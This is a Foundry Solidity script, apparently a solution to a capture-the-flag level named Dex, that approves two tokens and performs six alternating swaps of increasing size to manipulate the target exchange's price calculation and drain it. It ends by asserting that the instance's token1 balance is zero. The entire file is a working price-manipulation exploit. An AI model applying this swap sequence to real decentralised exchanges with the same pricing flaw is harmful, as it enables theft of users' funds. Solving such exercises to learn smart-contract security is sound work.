// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import "forge-std/Script.sol";
import "../src/interfaces/22_Dex.sol";
import "forge-std/interfaces/IERC20.sol";

address constant INSTANCE = 0xBe90FF7b44F0cD8A5e2e0480E64BBA125B3a7f47;

contract DexPOCScript is Script {
    IDex instance = IDex(INSTANCE);

    function run() external {
        vm.startBroadcast();

        address token1 = instance.token1();
        address token2 = instance.token2();
        vm.label(token1, "Token A");
        vm.label(token2, "Token B");

        IERC20(token1).approve(INSTANCE, 300);
        IERC20(token2).approve(INSTANCE, 300);

        instance.swap(token1, token2, 10);
        instance.swap(token2, token1, 20);
        instance.swap(token1, token2, 24);
        instance.swap(token2, token1, 30);
        instance.swap(token1, token2, 41);
        instance.swap(token2, token1, 45);

        vm.stopBroadcast();

        assert(instance.balanceOf(token1, INSTANCE) == 0);
    }
}
